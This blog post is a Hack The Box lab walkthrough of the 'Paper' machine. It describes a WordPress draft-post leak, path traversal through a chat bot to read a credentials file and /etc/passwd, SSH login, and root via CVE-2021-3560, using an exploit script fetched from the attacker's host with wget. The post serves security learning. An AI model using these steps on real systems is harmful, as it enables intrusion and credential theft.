@@ -1,0 +1,228 @@
+---
+title: Hackthebox Paper Writeup
+slug: hackthebox-paper-writeup
+description: Hackthebox release new machine called paper, in this machine on port 80 it's first leak the new vhost called office.paper on responce header X-Backend-Server after that wordpress version is vernable through Unauthenticated View Private/Draft Posts and we got the hint already with nick comment using the vernability we check the draft message that leak to another vhost and register ourself to that and get the directory Path Traversal and get the .env secret and login through ssh and for Privilege escalation we run linpeas that lead us to CVE-2021-3560.
+date: 2022-02-07
+image: hackthebox-paper-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.41]─[root@parrot]─[~/Desktop/HTB/Paper]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.143
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-07 00:04 CST
+Nmap scan report for 10.10.11.143
+Host is up (0.085s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey:
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_http-title: HTTP Server Test Page powered by CentOS
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_http-title: HTTP Server Test Page powered by CentOS
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.00 seconds
+```
+
+## Port-80
+
+It's a simple `static` page.
+
+<FixTheImageURL src='web.png' slug='hackthebox-paper-writeup' />
+
+Going over https site on port `443`. let's check the `certificate` first.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-paper-writeup' />
+
+No `usefull information` on certificates let's now check the `web page`.
+
+Same page which we see on `port 80`. nothing useful
+
+<FixTheImageURL src='web2.png' slug='hackthebox-paper-writeup' />
+
+I run the `gobuster` in background and `nothing found` there let's check the `responce headers` of the port `80`
+
+<FixTheImageURL src='burp.png' slug='hackthebox-paper-writeup' />
+
+And we found a `new vhost` let's add this on `/etc/hosts` file.
+
+## office.paper
+
+```js
+┌───[us-free-1]─[10.10.14.41]─[root@parrot]─[~/Desktop/HTB/Paper]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.143    office.paper
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Got a `new web page`. Theme look like `wordpress` theme let's conform that with `checking the footer`.
+
+<FixTheImageURL src='web3.png' slug='hackthebox-paper-writeup' />
+
+Yup i am right it's running `wordpress 5.2.3`
+
+<FixTheImageURL src='web4.png' slug='hackthebox-paper-writeup' />
+
+And i found one comment which tell `michael` to remove the `secret content` in drafts ASAP.
+
+But for checking the `drafts` we need `admin creads` that we don't have till now.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-paper-writeup' />
+
+Now let's search the exploit for `wordpress 5.2.3` on google.
+
+## WordPress 5.2.3 - Unauthenticated View Private/Draft Posts
+
+<br />
+Link : https://wpscan.com/vulnerability/9909
+
+This vulnerability could allow an `unauthenticated user` to view private or `draft posts` due to an issue within `WP_Query`.
+
+For that we just need to add `?static=1` after the url.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-paper-writeup' />
+
+## chat.office.paper
+
+And we get the `secret` that tell us about `new vhost` and registration url. let's add the vhost in `/etc/hosts` file.
+
+```js
+┌───[us-free-1]─[10.10.14.41]─[root@parrot]─[~/Desktop/HTB/Paper]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.143    office.paper chat.office.paper
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Going to `registration url` we get the registration form let's `register ourself`.
+
+<FixTheImageURL src='web7.png' slug='hackthebox-paper-writeup' />
+
+Now we are inside the `dashboard` let's click on general.
+
+<FixTheImageURL src='web8.png' slug='hackthebox-paper-writeup' />
+
+In the chat there is `recyclops bot` that helps the user to list the sales directory with `list command` and with `file command` we can view the content inside the file.
+
+<FixTheImageURL src='web9.png' slug='hackthebox-paper-writeup' />
+
+let's chat with `recyclops bot`.
+
+<FixTheImageURL src='web10.png' slug='hackthebox-paper-writeup' />
+
+I am using the `list and file command` to get the content inside `directory`.
+
+<FixTheImageURL src='web11.png' slug='hackthebox-paper-writeup' />
+
+the list `command list` the directory of current path let's try directory `Path Traversal` using `../`
+
+And we get the previous `directory content`. hubot directory looks `interesting` let's check the content in that.
+
+<FixTheImageURL src='web12.png' slug='hackthebox-paper-writeup' />
+
+Got a `.env` file. `.ENV` file usually use to store `secrets`.
+
+<FixTheImageURL src='web13.png' slug='hackthebox-paper-writeup' />
+
+let's check the content in that using file `../hubot/.env`
+
+And we got the `username` and `password`.
+
+<FixTheImageURL src='web14.png' slug='hackthebox-paper-writeup' />
+
+Let's try these `creads` to login inside `rocket.chat`
+
+<FixTheImageURL src='web15.png' slug='hackthebox-paper-writeup' />
+
+Let's check the `user available` in this machine using file `../../../etc/passwd`
+
+<FixTheImageURL src='web16.png' slug='hackthebox-paper-writeup' />
+
+## Shell as dwight
+
+Let's try to `login` through ssh with `dwight user`.
+
+And we got the `user.txt`
+
+```js
+┌───[us-free-1]─[10.10.14.41]─[root@parrot]─[~/Desktop/HTB/Paper]
+└──╼ [★]$ ssh dwight@10.10.11.143
+The authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.
+ECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.143' (ECDSA) to the list of known hosts.
+dwight@10.10.11.143's password:
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Mon Feb  7 01:33:06 2022 from 10.10.14.36
+[dwight@paper ~]$ cat user.txt
+de10a0c07ef81100a812a1bf274d0364
+[dwight@paper ~]$
+```
+
+## Privilege escalation
+
+### Recon with linpeas
+
+let's run `linPEAS`.
+
+And we see this machine is vulnerable to `CVE-2021-3560` that is `Polkit or Pwnkit` which allows `unprivileged user` to call privileged methods using `DBus`.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-paper-writeup' />
+
+## CVE-2021-3560
+
+<br />
+Link : https://github.com/Almorabea/Polkit-exploit
+
+Let's get this `python script` inside this `machine` and `run` this.
+
+```js
+[dwight@paper tmp]$ wget http://10.10.14.41/CVE-2021-3560.py
+[dwight@paper tmp]$ chmod +x CVE-2021-3560.py
+[dwight@paper tmp]$ python3 CVE-2021-3560.py
+```
+
+And we get the `root.txt` file.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-paper-writeup' />
